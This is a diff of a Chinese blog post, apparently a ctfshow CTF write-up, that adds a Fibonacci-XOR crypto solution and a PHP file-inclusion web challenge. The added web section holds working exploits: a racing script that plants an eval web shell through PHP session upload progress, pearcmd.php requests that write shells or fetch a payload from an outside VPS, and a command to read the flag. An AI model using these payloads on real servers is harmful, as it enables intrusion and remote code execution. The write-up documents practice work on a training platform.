@@ -47,8 +47,8 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 
 <!-- title、keywords、desc关键字 -->
 
-  <title>分类</title>
-  <meta name="title" content="分类" />
+  <title>微言</title>
+  <meta name="title" content="微言" />
 
 
 
@@ -93,8 +93,15 @@ daovoice('update');
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240111151903730.png">
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240111154117938.png">
+<meta property="og:image" content="https://img.hzy2003628.top/image-20240118120427136.png">
+<meta property="og:image" content="https://img.hzy2003628.top/image-20240118120513088.png">
+<meta property="og:image" content="https://img.hzy2003628.top/image-20240118122647958.png">
+<meta property="og:image" content="https://img.hzy2003628.top/image-20240118123346818.png">
+<meta property="og:image" content="https://img.hzy2003628.top/image-20240118130310786.png">
+<meta property="og:image" content="https://img.hzy2003628.top/image-20240118130254061.png">
+<meta property="og:image" content="https://img.hzy2003628.top/image-20240118130504065.png">
 <meta property="article:published_time" content="2024-01-11T06:34:46.000Z">
-<meta property="article:modified_time" content="2024-01-11T07:42:48.644Z">
+<meta property="article:modified_time" content="2024-01-18T05:09:30.867Z">
 <meta property="article:author" content="故里">
 <meta property="article:tag" content="ctfshow">
 <meta name="twitter:card" content="summary">
@@ -331,10 +338,16 @@ daovoice('update');
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2024-01-11 14:34:46 / 修改时间：15:42:48" itemprop="dateCreated datePublished" datetime="2024-01-11T14:34:46+08:00">2024-01-11</time>
+              <time title="创建时间：2024-01-11 14:34:46" itemprop="dateCreated datePublished" datetime="2024-01-11T14:34:46+08:00">2024-01-11</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-01-18 13:09:30" itemprop="dateModified" datetime="2024-01-18T13:09:30+08:00">2024-01-18</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -383,14 +396,14 @@ daovoice('update');
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.1k</span>
+              <span>10k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
+              <span>9 分钟</span>
             </span>
 
         </div>
@@ -440,6 +453,196 @@ print(tmp)
 <pre><code class="hljs plaintext">126292,165298,124522,116716,23623,21538,72802,90966,193480,77695,98618,127096,15893,65821,58966,163254,179952,134870,45821,21712,68316,87720,156070,16323,86266,148522,93678,110618,110445,136381,92706,129732,22416,177638,110110,4324,180608,3820,67750,134150,23116,116772,50573,149156,5292
 60144,146332,165671,109800,176885,65766,76908,147004,135068,182821,123107,77538,86482,88096,101725,16475,158935,123018,42322,144694,186769,176935,59296,134856,65813,131931,144283,95814,102191,185706,55744,67711,149076,108054,135112,100344,35434,121479,14506,145222,183989,17548,38904,27832,105943</code></pre>
 <p>考察斐波那契数</p>
+<blockquote>
+<p>斐波那契数，通常用 F(n) 表示，形成的序列称为 斐波那契数列 。该数列由 0 和 1 开始，后面的每一项数字都是前面两项数字的和</p>
+<p>F(0) = 0，F(1) = 1<br>
+F(n) = F(n - 1) + F(n - 2)，其中 n &gt; 1</p>
+</blockquote>
+<p>用gmpy2.fib计算每一个值的斐波那契数，然后两组每个相同位置互相异或即可得到最终答案</p>
+<pre><code class="hljs plaintext">import gmpy2
+with open(&#x27;1.txt&#x27;,&#x27;r&#x27;) as f:
+    txt = f.readlines()
+    data = eval(f&#x27;[&#123;txt[0]&#125;],[&#123;txt[1]&#125;]&#x27;)
+    # print(c)
+    print(len(data[0]))
+    print(len(data[1]))</code></pre>
+<pre><code class="hljs plaintext">PS C:\Users\25963\Desktop\1&gt;  c:; cd &#x27;c:\Users\25963\Desktop\1&#x27;; &amp; &#x27;C:\Program Files\Python311\python.exe&#x27; &#x27;c:\Users\25963\.vscode\extensions\ms-python.python-2023.22.1\pythonFiles\lib\python\debugpy\adapter/../..\debugpy\launcher&#x27; &#x27;4449&#x27; &#x27;--&#x27; &#x27;C:\Users\25963\Desktop\1\1.py&#x27; 
+45
+45</code></pre>
+<p>为了保证二进制补码的一致性，异或之后的值再与一下0xff(2:11111111)</p>
+<pre><code class="hljs plaintext">import gmpy2
+with open(&#x27;1.txt&#x27;,&#x27;r&#x27;) as f:
+    txt = f.readlines()
+    data = eval(f&#x27;[&#123;txt[0]&#125;],[&#123;txt[1]&#125;]&#x27;)
+    # print(c)
+    # print(len(data[0]))
+    # print(len(data[1]))
+for i in range(45):
+    f1=gmpy2.fib(data[0][i])
+    f2=gmpy2.fib(data[1][i])
+    print((chr((f1^f2)&amp;0xff)),end=&#x27;&#x27;)</code></pre>
+<pre><code class="hljs plaintext">PS C:\Users\25963\Desktop\1&gt;  c:; cd &#x27;c:\Users\25963\Desktop\1&#x27;; &amp; &#x27;C:\Program Files\Python311\python.exe&#x27; &#x27;c:\Users\25963\.vscode\extensions\ms-python.python-2023.22.1\pythonFiles\lib\python\debugpy\adapter/../..\debugpy\launcher&#x27; &#x27;5417&#x27; &#x27;--&#x27; &#x27;C:\Users\25963\Desktop\1\1.py&#x27; 
+ctfshow&#123;6d83b2f1-1241-4b25-9c1c-0a4c218f6c5f&#125;</code></pre>
+<h1 id="web">WEB</h1>
+<h2 id="easy_include">easy_include</h2>
+<pre><code class="hljs plaintext">&lt;?php
+
+function waf($path)&#123;
+    $path = str_replace(&quot;.&quot;,&quot;&quot;,$path);
+    return preg_match(&quot;/^[a-z]+/&quot;,$path);
+&#125;
+
+if(waf($_POST[1]))&#123;
+    include &quot;file://&quot;.$_POST[1];
+&#125;</code></pre>
+<p>文件包含，.替换成空，同时路径首字母必须是字母</p>
+<pre><code class="hljs plaintext">1=localhost/etc/passwd</code></pre>
+<img src="https://img.hzy2003628.top/image-20240118120427136.png" alt="image-20240118120427136" style="zoom:200%;">
+<p>接下来有两种解法，一个是SESSION文件包含，还有一个pearcmd【出题人的解题思路】</p>
+<h3 id="session文件包含">SESSION文件包含</h3>
+<p>看下图这个cookie，有PHPSESSID用官方的话来说就是自动开启了session，直接session文件包含</p>
+<img src="https://img.hzy2003628.top/image-20240118120513088.png" alt="image-20240118120513088" style="zoom:200%;">
+<p>边写session边读边包含，找个脚本改改就行</p>
+<pre><code class="hljs plaintext">import requests
+import io
+import threading
+ 
+ 
+url = &quot;http://448c53c8-9cad-43a9-9937-6890369b8586.challenge.ctf.show/&quot;
+session_id = &quot;guli&quot;
+ 
+ 
+def write(session):
+   filebytes = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)
+   while True:
+       res = session.post(url,
+           data=&#123;
+               &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &quot;&lt;?php eval($_POST[2]);?&gt;&quot;
+              &#125;,
+           cookies=&#123;
+               &#x27;PHPSESSID&#x27;: session_id
+              &#125;,
+           files=&#123;
+               &#x27;file&#x27;: (&#x27;hhh.jpg&#x27;, filebytes)
+              &#125;
+          )
+ 
+ 
+def read(session):
+   while True:
+       res = session.post(url,
+                          data=&#123;
+                              &quot;1&quot;:&quot;localhost/tmp/sess_&quot;+session_id,
+                              &quot;2&quot;:&quot;file_put_contents(&#x27;/var/www/html/guli.php&#x27; , &#x27;&lt;?php eval($_POST[3]);?&gt;&#x27;);&quot;
+                              
+                          &#125;,
+                          cookies=&#123;
+                              &quot;PHPSESSID&quot;:session_id
+                          &#125;
+                          )
+       res2 = session.get(&quot;http://448c53c8-9cad-43a9-9937-6890369b8586.challenge.ctf.show/guli.php&quot;)
+       if res2.status_code == 200:
+           print(&quot;成功写入一句话！&quot;)
+       else:
+           print(&quot;Retry&quot;)
+ 
+ 
+ 
+ 
+ 
+ 
+if __name__ == &quot;__main__&quot;:
+   evnet = threading.Event()
+   with requests.session() as session:
+       for i in range(5):
+           threading.Thread(target=write, args=(session,)).start()
+       for i in range(5):
+           threading.Thread(target=read, args=(session,)).start()
+   evnet.set()</code></pre>
+<pre><code class="hljs plaintext">PS C:\Users\25963\Desktop\1&gt;  c:; cd &#x27;c:\Users\25963\Desktop\1&#x27;; &amp; &#x27;C:\Program Files\Python311\python.exe&#x27; &#x27;c:\Users\25963\.vscode\extensions\ms-python.python-2023.22.1\pythonFiles\lib\python\debugpy\adapter/../..\debugpy\launcher&#x27; &#x27;16548&#x27; &#x27;--&#x27; &#x27;C:\Users\25963\Desktop\1\1.py&#x27; 
+Retry
+Retry
+Retry
+Retry
+Retry
+成功写入一句话！
+成功写入一句话！
+成功写入一句话！</code></pre>
+<img src="https://img.hzy2003628.top/image-20240118122647958.png" alt="image-20240118122647958" style="zoom:200%;">
+<h3 id="pearcmd">pearcmd</h3>
+<p>这个手法挺熟悉，但是不常用，记录一下以后说不定会用到</p>
+<blockquote>
+<p>php&lt;=7.3默认安装pecl/pear，在这之后的就需要主动去安装了</p>
+</blockquote>
+<p>首先肯定就是得找到pearcmd.php的路径了，这个就随缘找了</p>
+<pre><code class="hljs plaintext">/usr/local/lib/php/pearcmd.php</code></pre>
+<p>说明存在这个文件，接下来就固定套路了</p>
+<img src="https://img.hzy2003628.top/image-20240118123346818.png" alt="image-20240118123346818" style="zoom:200%;">
+<p>然后这地方也有两种思路来对应不同的解题，直接写或者借助VPS来远程下载</p>
+<h4 id="直接写">直接写</h4>
+<pre><code class="hljs plaintext">POST /?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[%27cmd%27]);?&gt;+/tmp/cmd.php HTTP/1.1
+Host: d2368f0f-6f6e-4fbe-99e7-aefb814f71bf.challenge.ctf.show
+Origin: http://d2368f0f-6f6e-4fbe-99e7-aefb814f71bf.challenge.ctf.show/
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Content-Length: 51
+
+1=localhost%2Fusr%2Flocal%2Flib%2Fphp%2Fpearcmd.php</code></pre>
+<pre><code class="hljs plaintext">GET传
+?+config-create+/&lt;?=@eval($_POST[%27cmd%27]);die()?&gt;+/tmp/test.php
+POST传
+1=localhost/usr/local/lib/php/pearcmd.php</code></pre>
+<pre><code class="hljs plaintext">回显内容
+CONFIGURATION (CHANNEL PEAR.PHP.NET): ===================================== Auto-discover new Channels auto_discover Default Channel default_channel pear.php.net HTTP Proxy Server Address http_proxy PEAR server [DEPRECATED] master_server Default Channel Mirror preferred_mirror Remote Configuration File remote_config PEAR executables directory bin_dir /%3C?=@eval($_POST[%27cmd%27]);die()?%3E/pear PEAR documentation directory doc_dir /%3C?=@eval($_POST[%27cmd%27]);die()?%3E/pear/docs PHP extension directory ext_dir /%3C?=@eval($_POST[%27cmd%27]);die()?%3E/pear/ext PEAR directory php_dir /%3C?=@eval($_POST[%27cmd%27]);die()?%3E/pear/php PEAR Installer cache directory cache_dir /%3C?=@eval($_POST[%27cmd%27]);die()?%3E/pear/cache PEAR configuration file cfg_dir /%3C?=@eval($_POST[%27cmd%27]);die()?%3E/pear/cfg directory PEAR data directory data_dir /%3C?=@eval($_POST[%27cmd%27]);die()?%3E/pear/data PEAR Installer download download_dir /%3C?=@eval($_POST[%27cmd%27]);die()?%3E/pear/download directory Systems manpage files man_dir /%3C?=@eval($_POST[%27cmd%27]);die()?%3E/pear/man directory PEAR metadata directory metadata_dir PHP CLI/CGI binary php_bin php.ini location php_ini --program-prefix passed to php_prefix PHP&#x27;s ./configure --program-suffix passed to php_suffix PHP&#x27;s ./configure PEAR Installer temp directory temp_dir /%3C?=@eval($_POST[%27cmd%27]);die()?%3E/pear/temp PEAR test directory test_dir /%3C?=@eval($_POST[%27cmd%27]);die()?%3E/pear/tests PEAR www files directory www_dir /%3C?=@eval($_POST[%27cmd%27]);die()?%3E/pear/www Cache TimeToLive cache_ttl Preferred Package State preferred_state Unix file mask umask Debug Log Level verbose PEAR password (for password maintainers) Signature Handling Program sig_bin Signature Key Directory sig_keydir Signature Key Id sig_keyid Package Signature Type sig_type PEAR username (for username maintainers) User Configuration File Filename /tmp/test.php System Configuration File Filename #no#system#config# Successfully created default configuration file &quot;/tmp/test.php&quot;</code></pre>
+<p>说明成了，然后去访问这个文件就行</p>
+<pre><code class="hljs plaintext">POST / HTTP/1.1
+Host: d2368f0f-6f6e-4fbe-99e7-aefb814f71bf.challenge.ctf.show
+Origin: http://d2368f0f-6f6e-4fbe-99e7-aefb814f71bf.challenge.ctf.show/
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Content-Length: 51
+
+1=localhost/tmp/cmd.php&amp;cmd=system(&quot;cat /f*&quot;);</code></pre>
+<p>就会回显出来flag内容</p>
+<h4 id="借助vps来远程下载">借助VPS来远程下载</h4>
+<pre><code class="hljs plaintext">GET传
+?+install+http://81.70.241.211:889/1.php
+POST包含pearcmd.php
+1=localhost/usr/local/lib/php/pearcmd.php</code></pre>
+<p>回显内容会带路径</p>
+<pre><code class="hljs plaintext">downloading 1.php ... Starting to download 1.php (19 bytes) ....done: 19 bytes Could not get contents of package &quot;/tmp/pear/download/1.php&quot;. Invalid tgz file. Download of &quot;http://81.xx.xx.xx:889/1.php&quot; succeeded, but it is not a valid package archive Invalid or missing remote package file install failed</code></pre>
+<img src="https://img.hzy2003628.top/image-20240118130310786.png" alt="image-20240118130310786" style="zoom:200%;">
+<p>去包含即可</p>
+<pre><code class="hljs plaintext">1=localhost/tmp/pear/download/1.php</code></pre>
+<img src="https://img.hzy2003628.top/image-20240118130254061.png" alt="image-20240118130254061" style="zoom:200%;">
+<p>当然如果出现不知道路径，比如执行不回显，这个方法显然有点难受，可以用download这个命令，他会自动下载到web目录下</p>
+<pre><code class="hljs plaintext">GET传
+?+download+http://81.70.241.211:889/1.php
+POST包含pearcmd.php
+1=localhost/usr/local/lib/php/pearcmd.php</code></pre>
+<img src="https://img.hzy2003628.top/image-20240118130504065.png" alt="image-20240118130504065" style="zoom:200%;">
+<pre><code class="hljs plaintext">注意:看了y4的博客，提到一点就是pearcmd.php被过滤怎么办，y4如是说，可以用peclcmd.php作为平替，好思路，记录一下</code></pre>
+<pre><code class="hljs plaintext">if (&#x27;/www/server/php/52/lib/php&#x27; != &#x27;@&#x27;.&#x27;include_path&#x27;.&#x27;@&#x27;) &#123;
+    ini_set(&#x27;include_path&#x27;, &#x27;/www/server/php/52/lib/php&#x27;);
+    $raw = false;
+&#125; else &#123;
+    // this is a raw, uninstalled pear, either a cvs checkout, or php distro
+    $raw = true;
+&#125;
+define(&#x27;PEAR_RUNTYPE&#x27;, &#x27;pecl&#x27;);
+require_once &#x27;pearcmd.php&#x27;;</code></pre>
+<h1 id="参考">参考</h1>
+<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">关于pearcmd利用总结 (y4tacker.github.io)</a></p>
 
     </div>
 
@@ -563,7 +766,7 @@ print(tmp)
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">1.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%88%E6%9C%88%E7%9A%84%E7%88%B1%E6%83%85%E6%95%85%E4%BA%8B"><span class="nav-number">1.1.</span> <span class="nav-text">月月的爱情故事</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BA%BB%E8%BE%A3%E5%85%94%E5%A4%B4%E5%8F%88%E4%B8%80%E9%94%85"><span class="nav-number">1.2.</span> <span class="nav-text">麻辣兔头又一锅</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">1.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%88%E6%9C%88%E7%9A%84%E7%88%B1%E6%83%85%E6%95%85%E4%BA%8B"><span class="nav-number">1.1.</span> <span class="nav-text">月月的爱情故事</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BA%BB%E8%BE%A3%E5%85%94%E5%A4%B4%E5%8F%88%E4%B8%80%E9%94%85"><span class="nav-number">1.2.</span> <span class="nav-text">麻辣兔头又一锅</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easy_include"><span class="nav-number">2.1.</span> <span class="nav-text">easy_include</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.1.1.</span> <span class="nav-text">SESSION文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pearcmd"><span class="nav-number">2.1.2.</span> <span class="nav-text">pearcmd</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E5%86%99"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">直接写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%80%9F%E5%8A%A9vps%E6%9D%A5%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">借助VPS来远程下载</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -958,7 +1161,7 @@ print(tmp)
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">18:01</span>
+    <span title="站点阅读时长">18:07</span>
 </div>
 
 
